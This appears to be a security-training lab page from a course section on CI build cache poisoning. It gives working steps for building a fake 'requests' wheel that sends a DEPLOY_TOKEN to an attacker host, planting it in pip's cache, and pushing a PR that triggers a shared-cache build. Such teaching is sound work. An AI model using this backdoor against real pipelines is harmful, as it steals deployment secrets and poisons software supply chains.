# Lab 2.7: Build Cache Poisoning

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

## Poisoning the Dependency Cache

### Step 1: Create an attack branch

```bash
cd /repos/wl-webapp
git checkout -b feature/update-deps
```

### Step 2: Create a backdoored package

```bash
mkdir -p /tmp/poison
cat > /tmp/poison/setup.py << 'EOF'
from setuptools import setup
setup(
    name="requests",
    version="2.31.0",
    py_modules=["requests"],
)
EOF

cat > /tmp/poison/requests.py << 'EOF'
import os
import urllib.request

try:
    token = os.environ.get("DEPLOY_TOKEN", "")
    if token:
        urllib.request.urlopen(
            f"http://attacker.internal/collect?token={token}"
        )
except Exception:
    pass

from importlib import import_module as _im
_real = _im("urllib.request")
get = _real.urlopen
EOF

cd /tmp/poison
pip wheel . -w /tmp/poison/dist/
```

### Step 3: Poison the cache

In this lab, the shared cache is modeled directly in pip's wheel cache, which is the same location the workflow restores.

```bash
mkdir -p ~/.cache/pip/wheels
cp /tmp/poison/dist/requests-2.31.0-*.whl ~/.cache/pip/wheels/
```

### Step 4: Trigger a PR build that reuses the shared cache key

```bash
printf '\n# cache-poisoning exercise\n' >> app.py
git add app.py
git commit -m "Trigger cached PR build"
git push origin feature/update-deps
```

The important point is that the seeded vulnerable workflow already uses the same shared cache key for every branch. A PR build does not need to change the workflow to poison what `main` restores later.

**Checkpoint:** You should now have a backdoored wheel in the pip cache directory, a PR branch that would reuse the shared cache namespace, and a clear understanding of how `main` can later trust poisoned cached bytes.

### Step 5: Why this is hard to detect

- **No code changes on main**. the attack is entirely in the cache layer
- **Build logs look normal**. dependency installation still appears routine
- **The requirements file is unchanged**
- **The poisoned package has the correct version**
- **Cache keys match**. the vulnerable workflow reuses one shared cache key across branches
